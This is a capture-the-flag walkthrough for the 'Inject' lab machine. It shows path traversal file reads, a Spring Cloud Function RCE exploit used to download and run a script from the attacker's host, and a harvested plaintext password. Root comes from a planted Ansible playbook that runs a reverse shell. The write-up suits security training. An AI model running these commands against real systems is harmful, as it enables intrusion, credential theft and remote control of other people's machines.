# easy - Inject

# Content

## User flag

Nothing running on tcp/80:
```bash
~x» curl inject.htb
curl: (7) Failed to connect to inject.htb port 80 after 151 ms: Couldn't connect to server
```

But found somethinging with nmap:
```bash
~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200
...
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Target web page found at inject.htb:8080/

![Zodd cloud page](/i/2023-03-20_14-28.png)

Checking html source code:

```bash
~x» curl -s http://inject.htb:8080/ | xurls
https://www.youtube.com/embed/qtOIh93Hvuw
~x» curl -s http://inject.htb:8080/ | grep href
  <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/css/bootstrap.min.css" />
  <link rel="stylesheet" href="css/test.css" />
            <a class="nav-link" href="/">Home</span></a>
            <a class="nav-link" href="#features">Features</a>
            <a class="nav-link" href="#how-it-works">How it Works</a>
            <a class="nav-link" href="/blogs">Blogs</a>
            <a class="nav-link" href="#pricing">Pricing</a>
          <a class="nav-link active" href="/upload">Upload</a>
          <a href="#" class="btn btn-primary my-2">Log in</a>
          <a href="/register" class="btn btn-secondary my-2">Sign Up</a>
```

There are 3 interesting http endpoints:

```bash
~x» curl -I http://inject.htb:8080/{upload,register,blog}
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Content-Length: 1857
Date: Mon, 20 Mar 2023 18:32:36 GMT

HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Content-Length: 5654
Date: Mon, 20 Mar 2023 18:32:36 GMT

HTTP/1.1 500
Content-Type: application/json
Transfer-Encoding: chunked
Date: Mon, 20 Mar 2023 18:32:36 GMT
Connection: close
```

* /register -> under construction
* /blog -> just dummy entries
* /upload -> here there might be something :flag:

Images can be uploaded (small images only), and the result can be seen in http://inject.htb:8080/show_image?img=image.jpg

![uploading images](/i/2023-03-20_14-56.png)

I've spent some time trying to inject something while uploading the image but after reading forums I've realized that it is about how the upload image is presented to you, that is injectable:

```bash
~x» wget -q 'http://inject.htb:8080/show_image?img=../../../../../../../etc/passwd' -O -
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

It turns out to be a spring boot app:

```bash
~x» wget -q 'http://inject.htb:8080/show_image?img=../../../pom.xml' -O - | ag spring
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
        <description>Demo project for Spring Boot</description>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                <finalName>spring-webapp</finalName>
```

#### Exploiting: CVE-2022-22963: Spring4Shell RCE Exploit

The vuln  source (this repo has been recently created :D): https://github.com/lemmyz4n3771/CVE-2022-22963-PoC

The simple/test bash script:

```bash
~x» cat z.sh
#!/bin/bash
whoami > /tmp/foobar
```

Uploading and executing:
```bash
~x» python3 exploit.py 'inject.htb:8080' 'wget http://10.10.14.69:8000/z.sh -O /tmp/z.sh'
[+] Host is vulnerable
[+] Command executed
[+] Exploit completed
~x» python3 exploit.py 'inject.htb:8080' 'chmod +x /tmp/z.sh'
[+] Host is vulnerable
[+] Command executed
[+] Exploit completed
~x» python3 exploit.py 'inject.htb:8080' '/tmp/z.sh'
[+] Host is vulnerable
[+] Command executed
[+] Exploit completed
~x»

~x» curl 'http://inject.htb:8080/show_image?img=../../../../../../../../../../tmp/foobar'
frank
```

I was not able to open a reverse bash shell, so I'm trying to read the files in the server: `find var/www/WebApp/src/main -type f > /tmp/foobar`

```bash
~x» curl -s 'http://inject.htb:8080/show_image?img=../../../../../../../../../../tmp/foobar'  | grep -v html
var/www/WebApp/src/main/resources/static/images/home.jpg
var/www/WebApp/src/main/resources/static/css/test.css
var/www/WebApp/src/main/resources/static/css/under.css
var/www/WebApp/src/main/resources/static/css/style.css
var/www/WebApp/src/main/resources/static/css/change.css
var/www/WebApp/src/main/resources/static/css/blog.css
var/www/WebApp/src/main/resources/META-INF/MANIFEST.MF
var/www/WebApp/src/main/resources/application.properties
var/www/WebApp/src/main/java/com/example/WebApp/WebAppApplication.java
var/www/WebApp/src/main/java/com/example/WebApp/user/User.java
var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java
var/www/WebApp/src/main/java/META-INF/MANIFEST.MF
```

Nothing interesting found. I had to upload the z.sh payload to put my ssh key into ~/.ssh/authorized_keys:

```bash
frank@inject:~$ pwd
/home/frank
frank@inject:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
frank@inject:~$ ls /home
frank  phil

frank@inject:~$ cat .m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```

```bash
frank@inject:~$ su phil
Password:

phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ ls
user.txt
```

## Root flag

I had to run this tool in order to enumrate the box: https://github.com/DominicBreuker/pspy - The following lines caught my attention:

```bash
2023/03/20 20:06:01 CMD: UID=0     PID=8069   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
2023/03/20 20:06:01 CMD: UID=0     PID=8068   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2023/03/20 20:06:01 CMD: UID=0     PID=8070   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
2023/03/20 20:06:01 CMD: UID=0     PID=8071   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
```

There is a cron job that executes ansible-parallel playbooks, whatever is put on this directory is executed: `/opt/automation/tasks`, check this playbook, it basically copies the root.txt to tmp and also I have a t.sh bash script that opens a reverse shell:

```yaml
- hosts: localhost
  tasks:
  - name: Copy file yeah
    ansible.builtin.copy:
      src: /root/root.txt
      dest: /tmp/root.txt
      owner: phil
      group: phil
      mode: '0644'
  - name: Run remote shell
    script: /home/phil/t.sh
```

Results?
```bash
x» nc -lvnp 55555
Connection from 10.129.233.105:48048
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/opt/automation/tasks
# ls ~/
playbook_1.yml
root.txt
```
